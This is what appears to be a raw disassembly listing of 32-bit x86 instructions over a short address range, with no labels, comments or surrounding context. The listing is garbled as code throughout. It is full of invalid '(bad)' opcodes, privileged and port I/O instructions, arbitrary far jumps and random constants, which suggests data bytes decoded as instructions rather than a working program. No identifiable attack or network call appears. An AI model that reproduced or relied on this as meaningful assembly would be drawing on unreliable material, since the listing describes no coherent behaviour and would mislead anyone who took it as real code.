  42278a:	sbb    DWORD PTR [esi+0x20f0e53c],ebp
  422790:	push   es
  422791:	psllq  mm7,QWORD PTR [edi]
  422794:	imul   edi,DWORD PTR [esi-0xe],0x44e14527
  42279b:	cmp    DWORD PTR [ebp+0x6d],ebp
  42279e:	(bad)  
  42279f:	push   cs
  4227a0:	jae    0x422726
  4227a2:	outs   dx,DWORD PTR ds:[esi]
  4227a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227a4:	mov    esp,0x0
	...
  4227b1:	addr16 jne 0x422780
  4227b4:	inc    eax
  4227b5:	fdivp  st(1),st
  4227b7:	out    dx,eax
  4227b8:	ja     0x422794
  4227ba:	or     ebx,esi
  4227bc:	pop    edi
  4227bd:	loopne 0x422786
  4227bf:	pop    ss
  4227c0:	in     al,0x95
  4227c2:	mov    al,ds:0x3ac0001
  4227c7:	add    BYTE PTR [eax],al
  4227c9:	sub    eax,0xec4e9747
  4227ce:	sbb    dh,cl
  4227d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227d1:	jb     0x422758
  4227d3:	sbb    ah,BYTE PTR [edi+0x17]
  4227d6:	add    al,0x43
  4227d8:	data16 fsub DWORD PTR [bx+di-0x3bff]
  4227de:	jbe    0x42284a
  4227e0:	sub    BYTE PTR [esi+ecx*2-0x7c82b11],ah
  4227e7:	push   ss
  4227e8:	cmp    al,0x71
  4227ea:	mov    dl,0xe0
  4227ec:	mov    ebx,0x70dab853
  4227f1:	xor    eax,0xe95c2b40
  4227f6:	add    DWORD PTR [ecx],esi
  4227f8:	int    0x6b
  4227fa:	mov    dl,0xb0
  4227fc:	fld    QWORD PTR [esi-0x12]
  4227ff:	sbb    al,0x9a
  422801:	fst    QWORD PTR [ebx+0x3e]
  422804:	pop    ebx
  422805:	(bad)  
  422807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422808:	ror    eax,1
  42280a:	push   eax
  42280b:	ja     0x4227fd
  42280d:	mov    cl,0x72
  42280f:	xchg   BYTE PTR [edx-0x38],ch
  422812:	and    ebp,DWORD PTR [esp+ebp*8+0x57]
  422816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422817:	inc    esi
  422818:	push   cs
  422819:	int    0x9b
  42281b:	xor    al,0x9e
  42281d:	jle    0x42289d
  42281f:	pop    edi
  422821:	cdq    
  422822:	dec    dh
  422824:	inc    ecx
  422825:	cld    
  422826:	rcr    DWORD PTR fs:[edi-0x7364a64a],cl
  42282d:	dec    edx
  42282e:	lods   eax,DWORD PTR ds:[esi]
  42282f:	daa    
  422830:	mov    dl,0xd
  422832:	inc    eax
  422833:	int3   
  422834:	cmp    cl,BYTE PTR [ecx-0x54f60988]
  42283a:	popa   
  42283b:	daa    
  42283c:	inc    eax
  42283d:	lock jae 0x422893
  422840:	pop    ebx
  422841:	icebp  
  422842:	push   es
  422843:	inc    ebx
  422844:	neg    dl
  422846:	aaa    
  422847:	adc    al,0xc7
  422849:	ror    DWORD PTR [esi],0x3a
  42284c:	inc    esi
  42284d:	and    BYTE PTR [edx],dh
  42284f:	(bad)  
  422850:	cwde   
  422851:	push   ss
  422852:	pop    ss
  422853:	sbb    al,0xb1
  422855:	dec    esp
  422856:	cmc    
  422857:	cmp    BYTE PTR [eax+0x6c],bl
  42285a:	inc    eax
  42285b:	jmp    0xb3bbfeb6
  422860:	xchg   esi,eax
  422861:	cwde   
  422862:	mov    eax,ds:0xae2b23b1
  422867:	pop    ss
  422868:	imul   ebp,DWORD PTR [ecx],0xff5d38be
  42286e:	ds stos BYTE PTR es:[edi],al
  422870:	std    
  422871:	xor    BYTE PTR [eax+0x5e59b561],al
  422877:	ins    DWORD PTR es:[edi],dx
  422878:	pop    ss
  422879:	inc    esi
  42287a:	push   edi
  42287b:	in     al,dx
  42287c:	out    dx,eax
  42287d:	icebp  
  42287e:	imul   esp,DWORD PTR [edx-0x59],0x1b699d6d
  422885:	mov    ah,0xc
  422887:	test   edi,edx
  422889:	shl    DWORD PTR [edi+ebp*8-0x4f],1
  42288d:	test   DWORD PTR [eax+0x6f4a2f64],edi
  422893:	cs inc esi
  422895:	scas   al,BYTE PTR es:[edi]
  422896:	outs   dx,DWORD PTR ds:[esi]
  422897:	imul   edi,DWORD PTR [ebx],0x5a
  42289a:	addr16 dec edi
  42289c:	aas    
  42289d:	and    BYTE PTR [ecx],bl
  42289f:	push   esi
  4228a0:	and    ebx,DWORD PTR [ebp-0x5e]
  4228a3:	(bad)
  4228a6:	and    BYTE PTR [ecx+0x11],ah
  4228a9:	fs mov cl,0xea
  4228ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228ad:	mov    ah,BYTE PTR [ebp+0x4edf8cba]
  4228b3:	mov    dh,BYTE PTR [ebp-0x46f113e1]
  4228b9:	dec    ecx
  4228ba:	imul   eax,DWORD PTR [ebp-0x70aa3bdd],0x9fd192d9
  4228c4:	jmp    0x7071:0xe008766a
  4228cb:	jno    0x4228a8
  4228cd:	(bad)  
  4228ce:	shl    BYTE PTR [ecx],0x42
  4228d1:	aaa    
  4228d2:	add    eax,0x2bebc7d3
  4228d7:	jle    0x4228a7
  4228d9:	xchg   edi,eax
  4228da:	sahf   
  4228db:	xchg   esp,eax
  4228dc:	idiv   dl
  4228de:	push   ss
  4228df:	pop    es
  4228e0:	mov    eax,0x6ba092ba
  4228e5:	sub    ah,BYTE PTR [esi-0x62]
  4228e8:	add    esi,DWORD PTR [eax-0x5281b066]
  4228ee:	mov    ebp,0x310a3bc2
  4228f3:	loop   0x422882
  4228f5:	dec    esp
  4228f6:	(bad)  
  4228f7:	jnp    0x4228a8
  4228f9:	add    DWORD PTR fs:[ecx+esi*2+0xb402d68],edi
  422901:	mov    ebp,0xfb862cd8
  422906:	ds call 0x8350:0xb53a493f
  42290e:	int3   
  42290f:	jle    0x42290e
  422911:	mov    ebp,0xf4964ed8
  422916:	sbb    DWORD PTR fs:[eax-0x4596c871],0xffffff91
  42291e:	inc    edx
  42291f:	mov    ds:0x4f5787f6,al
  422924:	push   esp
  422925:	or     esi,DWORD PTR [esi+0x192d1cd6]
  42292b:	shl    BYTE PTR [esi+0x2fb9445],cl
  422931:	or     BYTE PTR [ebx+0x12e1e70c],bl
  422937:	(bad)  
  422938:	cwde   
  422939:	mov    al,ds:0x87b8152f
  42293e:	jecxz  0x4228c2
  422940:	bound  eax,QWORD PTR [ecx-0x59af8918]
  422946:	push   eax
  422947:	adc    DWORD PTR [edx],eax
  422949:	test   DWORD PTR [ecx],ebp
  42294b:	jmp    0xd30f2727
  422950:	sub    ah,BYTE PTR ds:0xb84ffe32
  422956:	sbb    DWORD PTR [ecx],ecx
  422958:	jge    0x42295a
  42295a:	int3   
  42295b:	jmp    0xc5cd:0xca1c10a0
  422962:	sti    
  422963:	jl     0x422978
  422965:	rcr    edi,cl
  422967:	cmp    ah,BYTE PTR [ebx+ecx*8-0x2db817b7]
  42296e:	bound  ecx,QWORD PTR [eax]
  422970:	sbb    al,al
  422972:	js     0x4229f3
  422974:	sub    DWORD PTR [ecx+0x18],ebp
  422977:	ret    
  422978:	push   ss
  422979:	or     eax,0x3dfa17
  42297e:	sub    al,bh
  422980:	fdivp  st(7),st
  422982:	sub    dh,dl
  422984:	hlt    
  422985:	shr    BYTE PTR ds:0xbe512d2b,1
  42298b:	xlat   BYTE PTR ds:[ebx]
  42298c:	inc    edi
  42298d:	cli    
  42298e:	push   eax
  42298f:	shr    BYTE PTR [edx+ebx*4],cl
  422992:	sbb    dl,BYTE PTR [eax-0xa]
  422995:	push   ds
  422996:	mov    ds:0x5d47b678,eax
  42299b:	pop    edx
  42299c:	fild   DWORD PTR [edx-0x80]
  42299f:	xor    eax,0x71b8a8b9
  4229a4:	xchg   edx,eax
  4229a5:	dec    esp
  4229a6:	clc    
  4229a7:	xor    BYTE PTR [esi-0x2975f34d],bh
  4229ad:	push   esi
  4229ae:	scas   eax,DWORD PTR es:[edi]
  4229af:	lods   al,BYTE PTR ds:[esi]
  4229b0:	je     0x4229c1
  4229b2:	aaa    
  4229b3:	add    BYTE PTR [eax+esi*1+0x4f0f9de0],ch
  4229ba:	fst    QWORD PTR [edx+eax*1]
  4229bd:	inc    ecx
  4229be:	and    eax,0xdd42d81e
  4229c3:	(bad)  
  4229c5:	cs (bad) 
  4229c7:	jg     0x42299f
  4229c9:	dec    edi
  4229ca:	pop    ss
  4229cb:	adc    eax,0x30c8eb11
  4229d0:	cmp    DWORD PTR [ecx+0x4c],ecx
  4229d3:	int3   
  4229d4:	inc    eax
  4229d5:	xchg   DWORD PTR [ebx+edx*8-0x104f3670],esp
  4229dc:	ja     0x422a4c
  4229de:	xor    edi,esi
  4229e0:	cwde   
  4229e1:	iret   
  4229e2:	mov    ds:0x421ad0c2,al
  4229e7:	jge    0x422a63
  4229e9:	aad    0x56
  4229eb:	cmp    al,0xa4
  4229ed:	into   
  4229ee:	fwait
  4229ef:	pop    esp
  4229f0:	mov    esp,0xae14981f
  4229f5:	sbb    al,BYTE PTR [edx+0x592a6acd]
  4229fb:	inc    ebp
  4229fc:	mov    al,ds:0x3b9b30ba
  422a01:	push   esi
  422a02:	pop    ebx
  422a03:	test   eax,0x73aeb08b
  422a09:	test   DWORD PTR [edi+ecx*8-0x55908387],esp
  422a10:	pop    esi
  422a11:	push   0x7c
  422a13:	jno    0x422a39
  422a15:	cld    
  422a16:	inc    esp
  422a17:	pop    esp
  422a18:	mov    ebx,DWORD PTR [esi-0x73a48d0]
  422a1e:	adc    al,al
  422a20:	pushf  
  422a21:	xchg   esp,edx
  422a23:	lea    ebp,[ecx]
  422a25:	mov    BYTE PTR [edx-0x72],0x55
  422a29:	and    DWORD PTR [ecx+0x261ede],esp
  422a2f:	push   eax
  422a30:	mov    BYTE PTR [ebx+0x24],0xb
  422a34:	mov    dh,0x8d
  422a36:	jns    0x422a9d
  422a38:	adc    DWORD PTR [ebp+0xc9b973b],ebp
  422a3e:	retf   
  422a3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a40:	(bad)  
  422a41:	mov    WORD PTR [edi-0x4542ab98],?
  422a47:	in     eax,0xf0
  422a49:	in     eax,dx
  422a4a:	mov    dl,0xab
  422a4c:	adc    ah,BYTE PTR [edi+edx*1-0xb]
  422a50:	imul   eax,DWORD PTR [ecx+0x3875ef86],0x32fa701c
  422a5a:	mov    cl,0xbd
  422a5c:	fcom   st(7)
  422a5e:	lea    edi,[ecx-0x7d353a24]
  422a64:	int3   
  422a65:	jb     0x422a67
  422a67:	lahf   
  422a68:	rcl    BYTE PTR [esi-0x2b],cl
  422a6b:	fwait
  422a6c:	ja     0x422a14
  422a6e:	add    BYTE PTR [ebx+0x21],bl
  422a71:	pop    esi
  422a72:	push   ebx
  422a73:	push   esp
  422a74:	test   eax,0xe65b0a1b
  422a79:	je     0x422ac9
  422a7b:	adc    BYTE PTR [edx+0x33f8d27b],dh
  422a81:	inc    ebx
  422a82:	rol    BYTE PTR [eax+0x48],0xd9
  422a86:	sti    
  422a87:	mov    ds:0xef4ba8dd,al
  422a8c:	xchg   esi,eax
  422a8d:	mov    dh,0x7f
  422a8f:	in     al,dx
  422a90:	mov    al,ds:0x70d1389d
  422a95:	dec    ecx
  422a96:	adc    ecx,DWORD PTR [eax]
  422a98:	dec    ecx
  422a99:	mov    al,ds:0xe217f2d4
  422a9e:	popf   
  422a9f:	push   cs
  422aa0:	outs   dx,DWORD PTR ds:[esi]
  422aa1:	cmp    BYTE PTR [ecx-0x73],bl
  422aa4:	jno    0x422ad2
  422aa6:	repnz loopne 0x422a54
  422aa9:	pop    ebp
  422aaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422aab:	fs mov ebx,0x22f0bab9
  422ab1:	leave  
  422ab2:	jg     0x422a6a
  422ab4:	add    ah,dh
  422ab6:	mov    edi,0x3cf71306
  422abb:	rcl    DWORD PTR [edi],1
  422abd:	inc    edx
  422abe:	and    DWORD PTR [ecx+0x61034ea3],edx
  422ac4:	mov    ebx,0x2931f593
  422ac9:	adc    eax,0xb85a49aa
  422ace:	pop    edx
  422acf:	push   edi
  422ad0:	or     cl,ah
  422ad2:	xor    ebp,DWORD PTR [ebx*1-0x6527d30]
  422ad9:	repnz inc ebp
  422adb:	retf   0x9b91
  422ade:	hlt    
  422adf:	adc    eax,0x382f500c
  422ae4:	cmc    
  422ae5:	scas   eax,DWORD PTR es:[edi]
  422ae6:	add    edx,0xffffffe2
  422ae9:	mov    ebx,0x1693ebed
  422aee:	jge    0x422b5f
  422af0:	jo     0x422acf
  422af2:	aam    0xcc
  422af4:	xor    DWORD PTR [ebx],eax
  422af6:	pusha  
  422af7:	nop
  422af8:	jmp    0xd9e0:0x1ddf78be
  422aff:	aad    0x83
  422b01:	bound  ecx,QWORD PTR [ecx+0x1b]
  422b04:	test   DWORD PTR [edx],ecx
  422b06:	sub    esp,DWORD PTR [eax]
  422b08:	jge    0x422aaa
  422b0a:	or     dh,al
  422b0c:	add    BYTE PTR [ecx-0x47511b12],dh
  422b12:	jae    0x422b42
  422b14:	or     BYTE PTR [ebx-0x1e],0x2f
  422b18:	fsubr  QWORD PTR [eax]
  422b1a:	std    
  422b1b:	test   DWORD PTR [eax],eax
  422b1d:	mul    BYTE PTR [ebx+0x72]
  422b20:	inc    esi
  422b21:	les    ebp,FWORD PTR [ecx-0xf543c50]
  422b27:	mov    edx,0xb0fbf720
  422b2c:	dec    esp
  422b2d:	push   ecx
  422b2e:	inc    edx
  422b2f:	pusha  
  422b30:	dec    ebx
  422b31:	sub    BYTE PTR [esi-0x35],0x2c
  422b35:	std    
  422b36:	lods   eax,DWORD PTR ds:[esi]
  422b37:	jge    0x422ad5
  422b39:	mov    eax,0xe736186f
  422b3e:	pop    eax
  422b3f:	in     al,dx
  422b40:	xchg   ebx,eax
  422b41:	sar    BYTE PTR ds:0x9ff5d928,1
  422b47:	and    BYTE PTR [ecx-0x7a0bb82],0xc
  422b4e:	mov    ds:0xb018beaf,al
  422b53:	es dec eax
  422b55:	std    
  422b56:	clc    
  422b57:	mov    bl,0x3d
  422b59:	scas   al,BYTE PTR es:[edi]
  422b5a:	(bad)  
  422b5c:	adc    DWORD PTR [esi-0x49],ebx
  422b5f:	push   0xffffff92
  422b61:	fwait
  422b62:	ror    ch,cl
  422b64:	push   ebp
  422b65:	or     BYTE PTR [edx-0x49],ch
  422b68:	idiv   DWORD PTR [esi]
  422b6a:	mov    cl,BYTE PTR [edi]
  422b6c:	mov    bl,0xd9
  422b6e:	pop    ds
  422b6f:	bnd jae 0x422bc9
  422b72:	test   eax,0x1704
	...
  422b7f:	add    BYTE PTR [eax],al
  422b81:	mov    al,ds:0xbc09b42c
  422b86:	cdq    
  422b87:	mov    ebp,0x52812ad
  422b8c:	xor    bh,dl
  422b8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b8f:	pop    ebx
  422b90:	aam    0x41
  422b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b93:	add    DWORD PTR [eax],eax
  422b95:	lods   al,BYTE PTR ds:[esi]
  422b96:	add    eax,DWORD PTR [eax]
  422b98:	add    dl,ah
  422b9a:	mov    edi,0xfe74b796
  422b9f:	inc    ebp
  422ba0:	sar    BYTE PTR [ebx-0x4b],1
  422ba3:	push   es
  422ba4:	inc    ecx
  422ba5:	xor    eax,eax
  422ba7:	test   al,0x8a
  422ba9:	inc    edx
  422baa:	jmp    0x422b4b
  422bac:	xor    DWORD PTR [esp+ebx*8+0x30f25264],esp
  422bb3:	bnd jae 0x422c26
  422bb6:	lock fdiv QWORD PTR [esi]
  422bb9:	test   al,0xa8
  422bbb:	cmp    cl,bh
  422bbd:	or     al,0x94
  422bbf:	xchg   ecx,eax
  422bc0:	imul   ecx,ecx,0x542d4300
  422bc6:	int3   
  422bc7:	fist   WORD PTR [ecx-0x1035d9e2]
  422bcd:	cdq    
  422bce:	jmp    0x422b80
  422bd0:	ror    DWORD PTR [eax-0x29],1
  422bd3:	adc    eax,0x45d041f8
  422bd8:	mov    ebx,0x94df3fe2
  422bdd:	and    eax,0xb8a6223f
  422be2:	out    dx,al
  422be3:	int    0x1e
  422be5:	push   edi
  422be6:	mov    edx,0x2d9b76cc
  422beb:	push   edi
  422bec:	std    
  422bed:	jmp    0x8d67:0xc5b5b97c
  422bf4:	out    dx,eax
  422bf5:	jecxz  0x422bb7
  422bf7:	or     dh,ah
  422bf9:	mov    ah,bl
  422bfb:	(bad)  
  422bfc:	scas   al,BYTE PTR es:[edi]
  422bfd:	pop    esi
  422bfe:	test   BYTE PTR [ebx+0x609a8170],dl
  422c04:	cmp    eax,0x99397a07
  422c09:	outs   dx,DWORD PTR ds:[esi]
  422c0a:	dec    esp
  422c0b:	xchg   edx,eax
  422c0c:	add    DWORD PTR [esi+eiz*2],edx
  422c0f:	addr16 (bad) 
  422c11:	mov    WORD PTR [edx+0x4f],?
  422c14:	lea    edi,[ebp-0x1f]
  422c17:	leave  
  422c18:	clc    
  422c19:	call   0xece7:0xc9fbf5e7
  422c20:	sti    
  422c21:	cld    
  422c22:	int    0xd0
  422c24:	inc    edi
  422c25:	push   es
  422c26:	sbb    ch,BYTE PTR [eax+0x3]
  422c29:	loope  0x422c4f
  422c2b:	push   esp
  422c2c:	pop    ecx
  422c2d:	inc    eax
  422c2e:	shr    al,1
  422c30:	pop    ss
  422c31:	sbb    ebx,edi
  422c33:	cmp    eax,0x5bbc4ee8
  422c38:	sbb    BYTE PTR [esi],ch
  422c3a:	dec    edi
  422c3b:	cmp    dh,BYTE PTR [ebx+0x25]
  422c3e:	push   0x7c
  422c40:	ds (bad) 
  422c42:	sub    dl,bh
  422c44:	test   BYTE PTR [ebp+ebp*8-0x60],bl
  422c48:	fst    QWORD PTR [edx]
  422c4a:	outs   dx,BYTE PTR ds:[esi]
  422c4b:	pop    eax
  422c4c:	aad    0x59
  422c4e:	gs adc eax,0xfc8466ab
  422c54:	and    ebx,DWORD PTR [ebp-0x269af258]
  422c5a:	inc    esp
  422c5b:	cmp    eax,0xa471f97a
  422c60:	adc    ch,BYTE PTR [edi+0xc]
  422c63:	ret    0x4c28
  422c66:	mov    bl,0x2b
  422c68:	pushf  
  422c69:	and    cl,BYTE PTR [esi-0x6a9ee59d]
  422c6f:	mov    cl,0x79
  422c71:	jne    0x422cdc
  422c73:	dec    edx
  422c74:	jae    0x422c91
  422c76:	or     DWORD PTR ds:0xedd5ad6,ebp
  422c7c:	jns    0x422c94
  422c7e:	dec    ecx
  422c7f:	pop    eax
  422c80:	inc    esp
  422c81:	data16 adc al,BYTE PTR [esi]
  422c84:	cld    
  422c85:	push   ebx
  422c86:	adc    esp,esp
  422c88:	rcl    DWORD PTR ds:0x23a61c47,1
  422c8e:	js     0x422c7b
  422c90:	in     al,dx
  422c91:	repnz cwde 
  422c93:	sbb    ebx,edx
  422c95:	ins    BYTE PTR es:[edi],dx
  422c96:	sub    bl,0x19
  422c99:	(bad)  
  422c9a:	mov    ebp,0xc8a811a
  422c9f:	xchg   esi,eax
  422ca0:	sbb    bh,dl
  422ca2:	mov    edx,0x1630f5bd
  422ca7:	aaa    
  422ca8:	mov    al,ds:0xf110d6bb
  422cad:	repnz sar BYTE PTR [ecx-0x3615667b],1
  422cb4:	jnp    0x422c59
  422cb6:	push   ebp
  422cb7:	jae    0x422c49
  422cb9:	out    dx,eax
  422cba:	leave  
  422cbb:	inc    ebx
  422cbc:	stos   DWORD PTR es:[edi],eax
  422cbd:	mov    ds:0xa81865ae,eax
  422cc2:	bound  ebx,QWORD PTR ds:0xb2fcd09c
  422cc8:	and    BYTE PTR [edx+0x6b],bl
  422ccb:	les    edi,FWORD PTR [eax]
  422ccd:	rcr    ebx,1
  422ccf:	dec    esp
  422cd0:	xor    BYTE PTR [eax-0x6e05a675],dh
  422cd6:	xor    BYTE PTR [esi],dh
  422cd8:	dec    ebp
  422cd9:	push   ss
  422cda:	mov    ds:0x66f08a26,eax
  422cdf:	push   edi
  422ce0:	lods   al,BYTE PTR ds:[esi]
  422ce1:	push   ss
  422ce2:	scas   al,BYTE PTR es:[edi]
  422ce3:	mov    cl,0xb4
  422ce5:	jp     0x422d4f
  422ce7:	scas   eax,DWORD PTR es:[edi]
  422ce8:	shl    BYTE PTR [ecx],0x3d
  422ceb:	adc    DWORD PTR [ebx],eax
  422ced:	fcomp  DWORD PTR [ebx]
  422cef:	pop    ecx
  422cf0:	in     eax,dx
  422cf1:	xchg   ebp,eax
  422cf2:	test   esp,ecx
  422cf4:	(bad)  
  422cf5:	push   ebx
  422cf6:	push   edi
  422cf7:	pop    esi
  422cf8:	in     eax,dx
  422cf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cfa:	or     esi,esp
  422cfc:	dec    ebp
  422cfd:	dec    esp
  422cfe:	jns    0x422d57
  422d00:	leave  
  422d01:	das    
  422d02:	and    BYTE PTR [esi],bh
  422d04:	or     al,0x4d
  422d06:	xchg   DWORD PTR [esi],esp
  422d08:	or     eax,0x9e2e50c6
  422d0d:	xchg   esp,eax
  422d0e:	aas    
  422d0f:	and    al,0xa1
  422d11:	pop    ecx
  422d12:	xchg   ebp,eax
  422d13:	fwait
  422d14:	pop    eax
  422d15:	jecxz  0x422c97
  422d17:	test   BYTE PTR [ebp+0x701da186],dl
  422d1d:	pop    ss
  422d1e:	pop    esp
  422d1f:	mov    dl,0xf7
  422d21:	ins    BYTE PTR es:[edi],dx
  422d22:	add    al,0x4d
  422d24:	jge    0x422d6f
  422d26:	mov    bl,0x44
  422d28:	push   ebp
  422d29:	push   ecx
  422d2a:	adc    BYTE PTR [eax+0x5a43b374],ch
  422d30:	jb     0x422d55
  422d32:	inc    ecx
  422d33:	dec    esi
  422d34:	mov    esp,0x49faeee4
  422d39:	add    dl,BYTE PTR [edi-0xafff1d1]
  422d3f:	sbb    dl,BYTE PTR [ebx-0x4a]
  422d42:	jp     0x422d10
  422d44:	add    al,bl
  422d46:	daa    
  422d47:	push   es
  422d48:	ffreep st(0)
  422d4a:	ret    0xbd70
  422d4d:	add    BYTE PTR [esi],bh
  422d4f:	mov    cl,0x1b
  422d51:	jae    0x422d39
  422d53:	xlat   BYTE PTR ds:[ebx]
  422d54:	scas   al,BYTE PTR es:[edi]
  422d55:	add    DWORD PTR [ebp+0x327153d2],0x7fe3e2dd
  422d5f:	sbb    esi,DWORD PTR [edx-0x761a3a4]
  422d65:	mov    WORD PTR ds:0x31c934cc,es
  422d6b:	and    DWORD PTR [edx+0x7c],ebp
  422d6e:	aam    0xee
  422d70:	jno    0x422d74
  422d72:	cmp    dl,BYTE PTR [eax]
  422d74:	lods   al,BYTE PTR ds:[esi]
  422d75:	jp     0x422d1c
  422d77:	ins    BYTE PTR es:[edi],dx
  422d78:	cwde   
  422d79:	or     eax,0x6c0de80c
  422d7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d7f:	fs stc 
  422d81:	pop    ebp
  422d82:	f2xm1  
  422d84:	jbe    0x422d45
  422d86:	xor    ebx,DWORD PTR [ecx+0x5ae2615a]
  422d8c:	std    
  422d8d:	gs cmc 
  422d8f:	and    al,BYTE PTR [esi]
  422d91:	loope  0x422df4
  422d93:	xchg   edi,eax
  422d94:	fistp  DWORD PTR [edx-0x61]
  422d97:	sbb    dh,BYTE PTR [ebx+ebx*4-0x47a54cd6]
  422d9e:	xor    ah,BYTE PTR [edx]
  422da0:	xchg   ebx,eax
  422da1:	xchg   al,al
  422da3:	push   edx
  422da4:	pop    ds
  422da5:	arpl   WORD PTR [eax],ax
  422da7:	test   al,0xeb
  422da9:	or     edx,eax
  422dab:	xchg   edx,eax
  422dac:	push   cs
  422dad:	inc    esi
  422dae:	dec    ebx
  422daf:	sub    al,0xf1
  422db1:	scas   al,BYTE PTR es:[edi]
  422db2:	out    dx,eax
  422db3:	xchg   ebp,eax
  422db4:	ins    BYTE PTR es:[edi],dx
  422db5:	push   edi
  422db6:	push   ds
  422db7:	push   edi
  422db8:	jo     0x422df8
  422dba:	and    DWORD PTR [edi],edi
  422dbc:	imul   esi,DWORD PTR [ebp-0x5d9525fb],0xad20f63d
  422dc6:	sub    esi,DWORD PTR [edx+edi*4+0x75e1259e]
  422dcd:	ret    0xcc77
  422dd0:	loope  0x422d96
  422dd2:	(bad)  
  422dd3:	arpl   WORD PTR [ebp+0x37],cx
  422dd6:	inc    ecx
  422dd7:	mov    bh,0x3d
  422dd9:	sub    eax,0xe275296a
  422dde:	mov    eax,ds:0x55378e4b
  422de3:	cli    
  422de4:	xchg   ebp,eax
  422de5:	iret   
  422de6:	add    DWORD PTR [edi],esp
  422de8:	mov    edx,0x5400eed1
  422ded:	fwait
  422dee:	inc    esp
  422def:	dec    edi
  422df0:	xchg   ebx,eax
  422df1:	sbb    DWORD PTR [eax],eax
  422df3:	sbb    DWORD PTR [edx+ecx*1-0x7d],edi
  422df7:	lea    ebp,[ebx-0x62d90d93]
  422dfd:	pop    es
  422dfe:	rcr    DWORD PTR [esi],0xe6
  422e01:	push   esi
  422e02:	pop    eax
  422e03:	jbe    0x422e1b
  422e05:	add    edx,ebp
  422e07:	mov    esi,0x88f1f5f1
  422e0c:	xchg   ebp,eax
  422e0d:	ror    DWORD PTR [edi-0x6dcf67b9],cl
  422e13:	xor    bh,BYTE PTR [ebx+0x17]
  422e16:	cwde   
  422e17:	xchg   esi,eax
  422e18:	lahf   
  422e19:	mov    ch,0x58
  422e1b:	call   0x238b:0x7ebcc3
  422e22:	std    
  422e23:	mov    WORD PTR [edi],?
  422e25:	ret    
  422e26:	xor    eax,edx
  422e28:	rol    DWORD PTR [esi+0x72f5760a],0xc2
  422e2f:	loop   0x422ddd
  422e31:	or     dl,dh
  422e33:	jge    0x422e4c
  422e35:	lds    edi,FWORD PTR [edi-0x739bb490]
  422e3b:	das    
  422e3c:	test   eax,0x49e0e28b
  422e41:	add    al,BYTE PTR [eax-0x2c1cf11b]
  422e47:	xchg   ecx,eax
  422e48:	(bad)  
  422e49:	in     al,0x40
  422e4b:	push   ebx
  422e4c:	pop    es
  422e4d:	push   ecx
  422e4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e4f:	hlt    
  422e50:	jb     0x422e98
  422e52:	add    esp,DWORD PTR ds:0xdbe6e22d
  422e58:	push   edx
  422e59:	out    dx,eax
  422e5a:	inc    edi
  422e5b:	or     esi,DWORD PTR [esi-0xf900942]
  422e61:	(bad)  
  422e62:	lods   al,BYTE PTR ds:[esi]
  422e63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e64:	xor    BYTE PTR [ecx],bl
  422e66:	daa    
  422e67:	data16 jge 0x422ec6
  422e6a:	inc    eax
  422e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e6c:	mov    ah,0xf7
  422e6e:	iret   
  422e6f:	inc    esi
  422e70:	cdq    
  422e71:	leave  
  422e72:	push   edx
  422e73:	retf   0x1091
  422e76:	push   esp
  422e77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e78:	mov    edi,0xc05d91b8
  422e7d:	jge    0x422e10
  422e7f:	or     ebp,DWORD PTR [esi]
  422e81:	xor    DWORD PTR [ecx+esi*8],ebx
  422e84:	outs   dx,DWORD PTR ds:[esi]
  422e85:	cdq    
  422e86:	cmp    eax,0x5331bdc0
  422e8b:	mov    ebp,0x6625f783
  422e90:	jb     0x422f0f
  422e92:	out    dx,al
  422e93:	sbb    DWORD PTR [edx],ecx
  422e95:	in     al,dx
  422e96:	and    DWORD PTR [esi],eax
  422e98:	sbb    eax,esp
  422e9a:	and    ch,al
  422e9c:	shl    BYTE PTR [eax],0xf2
  422e9f:	icebp  
  422ea0:	enter  0xe120,0x62
  422ea4:	call   0xa73e2955
  422ea9:	loopne 0x422e7e
  422eab:	add    BYTE PTR [ebp+eax*8-0x71],ah
  422eaf:	adc    esp,DWORD PTR [edx-0xc9a08ec]
  422eb5:	mov    eax,ds:0x4e66da22
  422eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ebb:	or     esp,DWORD PTR [esi-0x3f9c5ece]
  422ec1:	jb     0x422e9e
  422ec3:	cli    
  422ec4:	arpl   WORD PTR [edx-0x45],bp
  422ec7:	pop    edi
  422ec8:	test   al,0x34
  422eca:	aaa    
  422ecb:	jmp    DWORD PTR ss:[eax]
  422ece:	add    eax,0x38f5a952
  422ed3:	dec    esi
  422ed4:	lods   al,BYTE PTR ds:[esi]
  422ed5:	nop
  422ed6:	push   ecx
  422ed7:	mov    edx,0x6b25bc7a
  422edc:	pusha  
  422edd:	fldenv [esi]
  422edf:	sub    ebp,edi
  422ee1:	(bad)  
  422ee2:	jnp    0x422ee8
  422ee4:	loopne 0x422eca
  422ee6:	outs   dx,DWORD PTR ds:[esi]
  422ee7:	xchg   BYTE PTR [ecx+0x643eaab3],al
  422eed:	ja     0x422e7a
  422eef:	dec    edx
  422ef0:	inc    edi
  422ef1:	or     al,0x45
  422ef3:	iret   
  422ef4:	push   ebp
  422ef5:	jns    0x422ede
  422ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ef8:	pushf  
  422ef9:	stc    
  422efa:	pop    ds
  422efb:	pop    ds
  422efc:	std    
  422efd:	xor    al,0x63
  422eff:	inc    ebp
  422f00:	(bad)  
  422f01:	fiadd  DWORD PTR [edx]
  422f03:	adc    eax,0x392c7050
  422f08:	pop    ds
  422f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f0a:	cwde   
  422f0b:	xor    BYTE PTR [edi-0x2b59d88d],dl
  422f11:	pop    esp
  422f12:	addr16 adc al,0x3a
